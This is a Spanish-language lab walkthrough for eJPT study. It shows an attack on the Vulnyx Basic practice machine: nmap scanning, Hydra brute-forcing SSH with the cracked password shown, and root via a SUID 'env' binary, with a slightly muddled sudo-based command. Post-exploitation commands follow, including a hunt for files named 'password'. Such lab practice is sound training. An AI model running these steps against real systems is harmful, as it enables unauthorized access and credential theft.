 
----
- TAG: #Escalada-De-Privilegios #Linux #Binarios #SUID 
-----
## Escalada de Privilegios con Binarios SUID

En este apartado, repasaremos la escalada de privilegios utilizando binarios **SUID**. Realizaremos un ejercicio similar al anterior, pero con un binario y una máquina diferente.

### Requisitos

1. **Kali Linux** como máquina atacante.
2. **Vulnyx Basic** como máquina víctima - [Descargar aquí](https://vulnyx.com/#basic)
    - Importa la máquina en VirtualBox.
    - Configura el adaptador de red en modo puente.
    - Inicia la máquina.

### Pasos

1. Desde la máquina atacante (Kali Linux), utilizamos `arp-scan` para identificar la máquina víctima en la red local:

```bash
sudo arp-scan -I eth0 --localnet
```

2. Verifica la conectividad con la máquina víctima utilizando `ping` y determina el tipo de sistema:

```bash
ping -c 1 1.2.3.4
```

3. Realiza un escaneo con `nmap` para identificar posibles vulnerabilidades:

```bash
nmap -p- -sS -sC -sV --open --min-rate=5000 -vvv -n -Pn 1.2.3.4 -oN escaneo
```
- **`-p-`**: Indicamos que se deben escanear **todos los puertos** (desde el 1 hasta el 65535).
- **`-sS`**: Realiza un **escaneo SYN**, que es más sigiloso que un escaneo TCP porque no establece una conexión completa.
- **`-sC`**: Usamos los **scripts por defecto** de Nmap
- **`-sV`**: Realizamos una **detección de versiones** de los servicios que estén ejecutándose en los puertos abiertos.
- **`--open`**: Solo muestra los **puertos abiertos**
- **`--min-rate=5000`**: Establece una tasa mínima de envío de paquetes de **5000 paquetes por segundo**
- **`-vvv`**: Nos muestra más detalles en tiempo real durante el escaneo.
- **`-n`**: Desactiva la resolución  DNS. Es decir, no intentará convertir las direcciones IP en nombres de dominio.
- **`-Pn`**: Indica que no se debe realizar un **ping previo** para verificar si el host está activo.
- **`-oN escaneo`**: Guarda el resultado del escaneo en un archivo llamado **`escaneo`** en formato normal (texto plano).

4. El escaneo revela que el puerto `80` está abierto. Accede al servicio web en ese puerto para investigar:

```bash
http://1.2.3.4
```

   En la página, vemos una plantilla de Apache, sin nada fuera de lo común.

5. El escaneo de `nmap` también muestra que los puertos `22`, `80` y `631` están abiertos. Al explorar el puerto `631`, encontramos un panel con varias opciones. Navegando a la sección `Printers`, encontramos un usuario llamado `dimitri`.

6. Dado que encontramos un usuario, podemos intentar un ataque de fuerza bruta para descubrir su contraseña. Como el puerto `22` (SSH) está abierto, utilizaremos **Hydra** para realizar el ataque:

```bash
hydra -l dimitri -P /usr/share/wordlists/rockyou.txt ssh://1.2.3.4
```

   **Nota:** Este proceso puede tardar, ya que la contraseña se encuentra en las últimas entradas del diccionario.

7. Una vez encontrada la contraseña:

```bash
dimitri:mememe
```

   Intenta iniciar sesión en el protocolo SSH:
   
```bash
ssh dimitri@1.2.3.4
```

   Introduce la contraseña cuando se te solicite:

```bash
mememe
```

8. Ahora, procederemos a escalar privilegios, como se explicó en la clase anterior, aprovechando los binarios **SUID**. Para ello, utilizamos el siguiente comando:

```bash
find / -perm -4000 2>/dev/null
```

   Esto listará todos los binarios SUID en el sistema. Si identificas uno que no debería estar ahí, como `env` en este caso, puedes usar `GTFObins` para confirmar si es común o no.

9. Utilizando `env`, ejecutamos los pasos sugeridos para obtener privilegios elevados:

 ```bash
sudo install -m =xs $(which env) .
env /bin/sh -p
```

   Si todo sale bien, deberías estar dentro como usuario `root`.

Ahora podríamos ejecutar el comando que queramos para ver más información sobre la máquina:
- Ver servicios corriendo:
```bash
ps aux
```

- Identificar puertos abiertos:
```bash
netstat -tulnp
```

- Ver conexiones activas:
```bash
ss -tuln
```

- Ver interfaces de red y direcciones IP
```bash
ip a
```

- **Buscar otros dispositivos en la red:** Si tienes acceso a herramientas como `nmap`, puedes escanear otros dispositivos en la red:
```bash
nmap -sP 192.168.1.0/24
```

- Buscar archivos que contengan la palabra 'password' u otras credenciales:
```bash
find / -name "*password*" 2>/dev/null
```
### Conclusión

Dominar esta técnica es crucial, ya que en el examen eJPT, al menos en una máquina, será necesario realizar una escalada de privilegios.

---
